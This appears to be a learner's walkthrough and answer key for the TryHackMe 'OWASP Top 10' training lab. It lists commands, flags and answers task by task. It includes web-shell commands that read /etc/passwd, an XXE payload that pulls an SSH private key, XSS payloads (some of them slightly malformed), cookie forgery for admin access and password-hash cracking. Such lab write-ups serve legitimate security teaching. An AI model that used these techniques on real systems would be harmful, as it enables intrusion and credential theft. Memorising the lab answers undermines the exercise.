# TryhackMe: OWASP Top 10

Part of tryhackme's "Complete Beginner" path, and Web Hacking Fundamentals module.

## Task 1: Introduction

Just Reading

## Task 2: Accessing machines

Just Reading

## Task 3: [Severity 1] Injection
Just Reading

## Task 4: [Severity 1] OS Command Injection
Just Reading

## Task 5: [Severity 1] Command Injection Practical

### 5.1

What strange text file is in the website root directory?
<br/>
Navigate to the /evilshell.php, and execute "ls"
<br/>
Answer: drpepper.txt

### 5.2

How many non-root/non-service/non-daemon users are there?
<br/>
Command used: cat /etc/passwd
<br/>
Answer: 0

### 5.3

What user is this app running as?
<br/>
Command: whoami
<br/>
Answer: www-data

### 5.4

What is the user's shell set as?
<br/>
Command: cat /etc/passwd | grep www-data
<br/>
Answer: /usr/sbin/nologin

### 5.5

What version of Ubuntu is running?
<br/>
Command: lsb_release -a
<br/>
Answer: 18.04.4

#### 5.6

Print out the MOTD. What favorite beverage is shown?
<br/>
Command: cat /etc/update-motd.d/00-header
<br/>
Answer: DR PEPPER

## Task 6: [Severity 2] Broken Authentication
Just Reading

## Task 7: [Severity 2] Broken Authentication Practical

### 7.1
What is the flag that you found in darren's account?
<br/>
Command: Created user " darren"
<br/>
Answer: fe86079416a21a3c99937fea8874b667

### 7.2
Now try to do the same trick and see if you can login as arthur.
<br/>
Answer: NULL

### 7.3
What is the flag that you found in arthur's account?
<br/>
Command: Created user " arthur"
<br/>
Answer:d9ac0f7db4fda460ac3edeb75d75e16e

## Task 8: [Severity 3] Sensitive Data Exposure (Introduction)
Just Reading

## Task 9: [Severity 3] Sensitive Data Exposure (Supporting Material 1)
Just Reading

## Task 10: [Severity 3] Sensitive Data Exposure (Supporting Material 2)
Just Reading

## Task 11: [Severity 3] Sensitive Data Exposure (Challenge)
### 11.1
What is the name of the mentioned directory?
<br/>
Command: dirb http://machineIP/ /usr/share/wordlists/dirb/big.txt 

<br/>
Answer: /assets

### 11.2
Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
<br/>
Command: machineIP/assets
<br/>
Answer: webapp.db

### 11.3
Use the supporting material to access the sensitive data. What is the password hash of the admin user?
<br/>
Command: sqllite3 doing a table dump with .table
<br/>
Answer: 6eea9b7ef19179a06954edd0f6c05ceb

### 11.4
What is the admin's plaintext password?
<br/>
Command: crackstation website
<br/>
Answer: qwertyuiop

### 11.5
Login as the admin. What is the flag?
<br/>
Command: machineIP/login 
<br/>
Answer: THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Task 12: [Severity 4] XML External Entity
Just Reading and deploying machine
## Task 13: [Severity 4 XML External Entity - eXtensible Markup Language
### 13.1
Full form of XML
<br/>
Answer: eXtensible Markup Language

### 13.2
Is it compulsory to have XML prolog in XML documents?
<br/>
Answer: no

### 13.3
Can we validate XML documents against a schema?
<br/>
Answer: yes

### 13.4
How can we specify XML version and encoding in XML document?
<br/>
Answer: XML prolog

## Task 14: [Severity 4] XML External Entity - DTD
### 14.1
How do you define a new ELEMENT?
<br/>
Answer: !ELEMENT

### 14.2
How do you define a ROOT element?
<br/>
Answer: !DOCTYPE

### 14.3
How do you define a new ENTITY?
<br/>
Answer: !ENTITY

## Task 15: [Severity 4] XML External Entity - XXE Payload
Just Reading
## Task 16: [Severity 4] XML External Entity - Exploiting
### 16.1
Try to display your own name using any payload.
<br/>
Answer: Completed without answer

### 16.2
See if you can read the /etc/passwd
<br/>
Answer: Completed without answer

### 16.3
What is the name of the user in /etc/passwd
<br/>
Answer: falcon

### 16.4
Where is falcon's SSH key located?
<br/>
"Command": knowledge from checking what the basic name of an ssh key is
<br/>
Answer: /home/falcon/.ssh/id_rsa

### 16.5
What are the first 18 characters for falcon's private key
<br/>
XMLParser: 
<br/>
<?xml version="1.0"?>
<br/>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<br/>
<root>&read;</root>
<br/>
Answer: MIIEogIBAAKCAQEA7

## Task 17: [Severity 5] Broken Access Control
Just Reading
## Task 18: [Severity 5] Broken Access Control (IDOR Challenge)
### 18.1
Read and understand how IDOR works.
<br/>
Answer: Completed without answer

### 18.2
Deploy the machine and go to http://MACHINE_IP - Login with the username being noot and the password test1234.
<br/>
Answer: Completed without answer

### 18.3
Look at other users notes. What is the flag?
<br/>
Flag location: MachineIP/note.php?note=0
<br/>
Answer: flag{fivefourthree} 

## Task 19: [Severity 6] Security Misconfiguration
### 19.1
Deploy the VM
<br/>
Answer: Completed without answer

### 19.2
Hack into the webapp, and find the flag!
<br/>
Search google for Pensive Notes default password
<br/>
Answer: thm{4b9513968fd564a87b28aa1f9d672e17}

## Task 20: [Severity 7] Cross-site Scripting


### 20.1
Deploy the VM
<br/>
Answer: Completed without answer

### 20.2

Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
<br/>
Command: (<script>alert(“Hello”)</script>)
<br/>
Answer: ThereIsMoreToXSSThanYouThink
### 20.3
On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
<br/>
Command: (<script>alert(“window.location.hostname”)</script>)
<br/>
Answer: ReflectiveXss4TheWin

### 20.4
Then add a comment and see if you can insert some of your own HTML.
<br/>
Using tags and a base for the html injection (plain html)
<br/>
Answer: HTML_T4gs

### 20.5
On the same page, create an alert popup box appear on the page with your document cookies.
<br/>
Command: (<script>alert(document.cookies)</script>)
<br/>
Answer: W3LL_D0N3_LVL2S

### 20.6
Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
<br/>
Answer:  websites_can_be_easily_defaced_with_xss


## Task 21: [Severity 8] Insecure Deserialization
### 21.1
Who developed the Tomcat application?
<br/>
A quick google search. Revealing the organization behind the software
<br/>
Answer: The Apache Software Foundation

### 21.2
What type of attack that crashes services can be performed with insecure deserialization?
<br/>
Found in the readin material provided
<br/>
Answer: Denial of Service

## Task 22: [Severity 8] Insecure Deserialization - Objects
### 22.1
if a dog was sleeping, would this be:
<br/>
A) A State
<br/>
B) A Behaviour 
<br/>
Answer: A Behaviour 

## Task 23: [Severity 8] Insecure Deserialization - Deserialization
### 23.1
What is the name of the base-2 formatting that data is sent across a network as? 
<br/>
Google search base-2
<br/>
Answer: binary

## Task 24: [Severity 8] Insecure Deserialization - Cookies
### 24.1
If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
<br/>
Answer: webapp.com/login

### 24.2
What is the acronym for the web technology that Secure cookies work over?
<br/>
Answer: HTTPS

## Task 25: [Severity 8] Insecure Deserialization - Cookies Practical
### 25.1
1st flag (cookie value)
<br/>
Decode the cookie named sessionID using a base64 decoder
<br/>
Answer: THM{good_old_base64_huh}

### 25.2
2nd flag (admin dashboard)
<br/>
Change the usertype cookie's value to admin and access machineIp/admin page
<br/>
Answer: THM{heres_the_admin_flag} 

## Task 26: [Severity 8] Insecure Deserialization - Code Execution
### 26.1
flag.txt
<br/>
Answer: 4a69a7ff9fd68

## Task 27:  [Severity 9] Components With Known Vulnerabilities - Intro
Just Reading
## Task 28: [Severity 9] Components With Known Vulnerabilities - Exploit
Just Reading
## Task 29: [Severity 9] Components With Known Vulnerabilities - Lab
### 29.1
How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)
<br/>
Answer:

## Task 30: [Severity 10] Insufficient Logging and Monitoring
### 30.1
What IP address is the attacker using?
<br/>
Look through the .txt log and look for Unauthorised login attempts
<br/>
Answer: 49.99.13.16

### 30.2
What kind of attack is being carried out?
<br/>
Answer: brute force

## Task 31: What Next? 
Just Reading


